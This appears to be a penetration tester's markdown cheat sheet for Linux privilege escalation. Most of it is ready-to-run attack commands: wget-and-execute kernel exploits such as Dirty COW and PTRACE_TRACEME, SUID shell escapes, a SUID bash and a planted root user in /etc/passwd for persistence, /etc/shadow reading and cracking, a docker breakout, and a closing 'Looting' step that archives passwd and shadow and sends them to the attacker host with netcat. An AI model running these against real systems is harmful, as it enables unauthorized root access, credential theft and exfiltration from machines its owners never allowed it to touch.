# Linux
## Metasploit
`run post/multi/recon/local_exploit_suggester`
## Setup
| Command Type     | Description                      | Command                                                               |
|:-----------------|:--------------------------------:|:---------------------------------------------------------------------|
| Shell Cleanup    | Python 2     | `python -c 'import pty;pty.spawn("/bin/bash")'`                                               |
| Shell Cleanup    | Python 3     | `python3 -c 'import pty;pty.spawn("/bin/bash")'`                                              |
| Shell Cleanup    | Perl  | `perl -e 'exec "/bin/bash";'` |
| Shell Cleanup    | Export xterm | `export TERM=xterm`                                                                           |
| Shell Cleanup    | Background  Process | `^z`                                                                                   |
| Shell Cleanup    | stty command | `stty raw -echo`                                                                              |
| Shell Cleanup    | Foreground | `fg <enter>`                                                                                    |
| Shell Cleanup    | stty command (Fix size) | `stty rows 50 columns 199` |
| Shell Cleanup    | Metasploit | `sessions -u 1`                                                                                 |
| Shell Cleanup    | Add paths (Missing Apps) | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`        |
| Escape RBASH     | Use ssh to run bash with no profile | `ssh $user@$ip -t "bash --noprofile"`                       |
| Escape RBASH     | Load binaries into the path | `export PATH=/bin:/usr/bin:$PATH`                       |
| Set Variables    | Load binaries into the path | `export lhost=$lhost`                       |

## Quick Wins
| Command Type | Command |
|--------------|---------|
| Sudo | `sudo -l` |
| SUID | `find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null` |

## Automated Tools
| Command Type     | Description                                | Command                                                               |
| -----------------|:------------------------------------------|:---------------------------------------------------------------------|
| set variables    | Set lhost variables | `export lhost=192.168.119.127` |
| set variables    | Set lhost variables | `export lhost=10.4.29.43` |
| wget             | Download privesc scripts         | `cd /tmp; mkdir privesc; cd privesc; wget -r -nd http://$lhost/linux/privesc/` |
| curl             | Download privesc scripts         | `curl -o linpeas.sh http://$lhost/linux/privesc/linpeas.sh`                   |
| chmod            | Give scripts execute permission  | `chmod -R 777 ./`                                       |
| linpeas          | Execute Linpeas                  | `./linpeas.sh`                                       |
| All in one       | Execute all other scripts        | `./linpeas.sh > linpeas.txt;./len.sh -t > len.txt;./lle.sh > lle.txt; ./lse.sh -i -l 2 > lse.txt; python lpc.py > lpc.txt; ./upc detailed > upc.txt` | 
| rm & tar         | Delete files & compress          | `rm *.sh *.py *.log *.html *.pl psp* upc unix* && cd ../ && tar -cvf privesc.tar ./privesc/ && rm -r privesc/`                                       |
| nc               | Send to Kali host via netcat     | `nc $lhost 235 < privesc.tar` |
| Exploit Suggester | Run on Kali host inf X.X.XX format | |`/root/share/linux/privesc/linux-exploit-suggester-2.pl â€“k $kernel` |

## Fix for exploits not compiling on targets
`PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/;export PATH`

## Compile Exploits 
### This works 32bit compiled on 64bit linux
`gcc -o 9542 9542.c -m32 -Wall -Wl,--hash-style=bot`
### Confirmed
| Exploit | Kernel | Command | 
|---------|--------|---------|
| overlayfs | 3.13, 3.16.0, 3.19.0 | `wget http://$lhost/kernel-exploits/overlayfs/ofs_64; chmod +x ofs_64; ./ofs_64` |
| 'double-fdput()' bpf(BPF_PROG_LOAD) | 4.4.x (Ubuntu 16.04) | `wget http://$lhost/linux/exploits/kernel/39772/exploit.tar; tar xvf exploit.tar; cd ebpf_mapfd_doubleput_exploit; chmod +x compile.sh; ./compile.sh; ./doubleput` |
| cowroot | 2.6.22 < 3.9 (x64) (Precompiled) | `wget http://$lhost/linux/exploits/kernel/cowroot_64; chmod +x cowroot_64; ./cowroot_64` |
| cowroot | 2.6.22 < 3.9 (x64) (Compiled) | `wget http://$lhost/linux/exploits/kernel/cowroot_64.c; gcc cowroot_64.c -o cowroot_64 -pthread; ./cowroot_64` |
| c0w | 2.6.22 < 3.9 (x64) (Compiled) | `wget http://$lhost/linux/exploits/kernel/c0w_64.c; gcc -pthread c0w_64.c  -o c0w_64; ./c0w_64`


### Not yet confirmed
| Exploit | Kernel | Details | CVE#    | Command |
|--------|---------|--------|---------|---------|
| 9542   | `wget http://$lhost/linux/exploits/kernel/9542; chmod +x 9542; ./9542` |
| 44298  | `wget http://$lhost/linux/exploits/kernel/44298_64; chmod +x 44298_64; ./44298_64` | 
| 40616  | Kernels: 2.6.22 < 3.9 (x86) | Dirty (Firefart) | 2016-5195 | `wget http://$lhost/linux/exploits/kernel/40616_x86; chmod +x 40616_x86; ./40616_x86`

### Not yet confirmed
| Exploit | Kernel | Details | CVE#    | Command |
|---------|---------|--------|---------|---------|
| 40871   | `wget http://$lhost/linux/exploits/kernel/40871_64; chmod +x 40871_64; ./40871_64` |
| 44325   | < 4.15.4 | 'show_floppy' KASLR Address Leak | 2018-7273 | `wget http://$lhost/linux/exploits/kernel/44325; chmod +x 44325; ./44325`
| 44579   | < 4.17-rc1 | 'AF_LLC' Double Free | N/A | `wget http://$lhost/linux/exploits/kernel/44579_64; chmod +x 44579_64; ./44579_64`
| 47163   | 4.10 < 5.1.17 | 'PTRACE_TRACEME' pkexec Local Privilege Escalation  | 2019-13272 | `wget http://$lhost/linux/exploits/kernel/47163_64; chmod +x 47163_64; ./47163_64` |
| 47164   | 4.15.x < 4.19.2 | map_write() CAP_SYS_ADMIN' Local Privilege Escalation (cron Method) | 2018-18955 | `wget -r -nd http://$lhost/linux/exploits/kernel/47164/; cd $lhost/linux/exploits/kernel/47164/cron/; chmod +x exploit.cron.sh; ./exploit.cron.sh` |
| 47165   | 4.15.x < 4.19.2 | map_write() CAP_SYS_ADMIN' Local Privilege Escalation (dbus Method) | 2018-18955 | `wget -r -nd http://$lhost/linux/exploits/kernel/47165/; cd $lhost/linux/exploits/kernel/47165/dbus/; chmod +x exploit.dbus.sh; ./exploit.dbus.sh` |
| 47166   | 4.15.x < 4.19.2 | map_write() CAP_SYS_ADMIN' Local Privilege Escalation (ldpreload Method) | 2018-18955 | `wget -r -nd http://$lhost/linux/exploits/kernel/47166/; cd $lhost/linux/exploits/kernel/47166/ldpreload/; chmod +x exploit.ldpreload.sh; ./exploit.ldpreload.sh` |
| 47167   | 4.15.x < 4.19.2 | map_write() CAP_SYS_ADMIN' Local Privilege Escalation (polkit Method) | 2018-18955 | `wget -r -nd http://$lhost/linux/exploits/kernel/47167/; cd $lhost/linux/exploits/kernel/47167/polkit/; chmod +x exploit.polkit.sh; ./exploit.polkit.sh` |

### American Sign Language
`wget http://$lhost/kernel-exploits/american-sign-language/american-sign-language; chmod +x american-sign-language; ./american-sign-language`
### Half Nelson
`wget http://$lhost/kernel-exploits/half-nelson/half-nelson3; chmod +x half-nelson3; ./half-nelson3`
### Krad3
`wget http://$lhost/kernel-exploits/krad3/krad3_32; chmod +x krad3_32; ./krad3_32`

### pktcdvd
`wget http://$lhost/kernel-exploits/pktcdvd/pktcdvd_32; chmod +x pktcdvd_32; ./pktcdvd_32`
`wget http://$lhost/kernel-exploits/pktcdvd/pktcdvd_64; chmod +x pktcdvd_64; ./pktcdvd_64`

### video4linux
`wget http://$lhost/kernel-exploits/video4linux/video4linux_32; chmod +x video4linux_32; ./video4linux_32`

### 1397
`wget http://$lhost/linux/exploits/kernel/1397; chmod +x 1397; ./1397`



### 9545
`wget http://$lhost/linux/exploits/kernel/9545; chmod +x 9545; ./9545`

### Memodipper
* Kernels 2.6.39, 3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0 | 
```
wget http://$lhost/linux/exploits/kernel/memodipper; chmod +x memodipper; ./memodipper
wget http://$lhost/linux/exploits/kernel/memodipper64; chmod +x memodipper64; ./memodipper64
```
### Dirty (Firefart) 
* Kernels: 2.6.22 < 3.9 (x86, x64)
```
wget http://$lhost/linux/exploits/kernel/dirty.c; gcc -pthread dirty.c -o dirty -lcrypt; ./dirty
gcc -pthread 40611.c -o 40611
./40611
```
```
wget http://$lhost/linux/exploits/kernel/40616_x86.c
gcc 40616_x86.c -o 40616_x86 -pthread
./40616_x86
```
wget http://$lhost/linux/exploits/kernel/c0w_32
chmod +x c0w_32
./c0w_32
wget http://$lhost/linux/exploits/kernel/c0w_64
chmod +x c0w_64
./c0w_64
wget http://$lhost/linux/exploits/kernel/cowroot_suid_32
chmod +x cowroot_suid_32
./cowroot_suid_32
wget http://$lhost/linux/exploits/kernel/cowroot_suid_64
chmod +x cowroot_suid_64
./cowroot_suid_64

### pp_key
* Kernels: 3.8.0, 3.8.1, 3.8.2, 3.8.3, 3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13, 3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6, 3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1
```
wget http://$lhost/kernel-exploits/pp_key/pp_key_64.c
gcc pp_key_64.c -o pp_key_64 -lkeyutils -Wall
./pp_key_64
```
* Find all SUID exploitable binaries from GTFOBins

  `curl https://gtfobins.github.io/#+suid | grep -F 'gtfobins' | grep -F 'SUID' | cut -d '/' -f 3 | tr '\n' ',' | sed s/,$//`

## File capabilities
https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/



# Create persistence with privileges
## rootbash
* Run the following commands with root to create a reusable root privsec
```bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```
## add public ssh key to authorized keys
```bash
echo "********" > authorized_keys
```
## Create shell script

  `echo "/bin/sh" > service`
  `chmod +x service`

## Create c program
```c
#include <stdio.h>
#include <unistd.h>

int main (void) {
    char *argv[] = { "/bin/bash", "-p", NULL };
    execve(argv[0], argv, NULL);
}
```
## Kernel Exploits
* Check lpc.txt
  
  `cat lpc.txt`

* Google kernel + 'kernel priv esc'

  `$kernel kernel priv esc`

* Search for kernel & priv esc

  `searchsploit linux kernel $kernel priv esc`

* Search for kernel & distribution

  `searchsploit linux kernel $kernel debian priv esc`
  `searchsploit linux kernel $kernel -e | grep exploits| awk -F "|" '{ print $2 }' | awk '{ print $1}'`

* Linux Exploit Suggester 2

  `/root/share/linux/privesc/linux-exploit-suggester-2.pl -k $kernel`

## Weak File Permissions
* Check shadow file permissions (Read allows password cracking / Write game over)

  `ls -l /etc/shadow`

### passwd file

* Check passwd file if writeable

  `ls -al /etc/passwd`

* If writeable generate a new password hash

  `openssl passwd "password"`

* Copy the generate password into the second field of the root user line (Replace x)
* Switch to root user

  `su`
### Writeable files
`find /etc/ -type f -writable 2>/dev/null`
## Credential Access
### Reused Passwords
### Credentials from Configuration Files
#### Check /var/log/audit/
```bash
cd /var/log/audit && cat * | grep 'comm="su"'
```
### Credentials from Local Database
### Credentials from Bash History
.mysql_history

### Credentials from network capture
* Show up and running network interfaces

  `tcpdump -D`

* Capture network traffic for 140 seconds

  `timeout 140 tcpdump -w cap.pcab -i $nic`

* View captured network traffic

  `tcpdump -r hehe.pcab`

### SSH Keys
### Sudo Access
* Use sudo to gain access to another users account

`sudo -i -u scriptmanager`

### Group Privileges (Docker, LXD, etc)
* If member of a docker group

```bash
docker images
docker run -v /:/mnt --rm -it privesc chroot /mnt sh
```
![Example](https://github.com/Michael-Cheney/pentest/blob/master/Method/03.%20Privilege%20Escalation/images/2021-01-08%2023_40_11.png)


## Exploit
### Services running on local host
* Check for Services running as root

`ps aux | grep "^root"`

### Kernel Version
### Binary File Versions
## Misconfiguration
### Cron Jobs
#### Writeable Cron Job
#### Writeable Cron Job Dependency (File, PYthon Library, etc)
### SUID/SGID Files

| Command | Type | Command                                                               |
| ------------------|------|-----------------------------------------------------------------------|
| base32            | SUID | `base32 "/etc/shadow" \| base32 --decode`                              |
| base32            | SUID | `base32 "/root/.ssh/id_rsa" \| /usr/bin/base32 --decode`               |
| Find              | SUID | `find . -exec /bin/sh -p \; -quit`                                    |
| nmap 1.1          | SUID | `nmap --interactive`                                                  |
| nmap 1.2          | SUID | `!sh`                                                                 |
| perl              | SUID | `perl -e 'exec "/bin/sh";'`                                           |
| pkexec            | SUID | `sudo pkexec /bin/sh`                                                 |
| php 1.1           | SUID | `CMD="/bin/sh"`                                                       |
| php 1.2           | SUID | `/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"`                 |
| start-stop-daemon | SUID | `/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p`          |
| snap | SUID | `https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py` | 



### Interesting Capabilities on Binary
### Sensative Files Writeable
#### /etc/passwd
* Copy the passwd file / add new credentials

  `cat /etc/passwd > /tmp/passwd.copy && echo 'hack:'$(openssl passwd -1 -salt hack 123)':0:0:root:/root:/bin/bash' >> /tmp/passwd.copy`
  `cp /tmp/passwd.copy /etc/passwd`

#### /etc/shadow
#### /etc/sudoers
#### Configuration Files
### Sensitive Files Readable
#### /etc/shadow
Get Permissions (If read can decrypt, if write game over)
```bash
ls -l /etc/shadow
```
Read root user password hash
```bash
head -n 1 /etc/shadow
```
Save the password hash
```bash
echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVl
aXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt'
```
Crack the password using John
```bash
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
#### /root/.ssh/id_rsa (Private Keys)
### Writeable Path
### Root $PATH Writeable
### Directory in PATH Writeable
### LD_PRELOAD Set in /etc/sudoers

## Looting
```
cd /tmp; mkdir loot; cd loot
cp /etc/passwd .; cp /etc/shadow .; cp /root/proof.txt .
cd ../ && tar -cvf loot.tar ./loot/ && rm -r loot/
nc $lhost 235 < loot.tar
```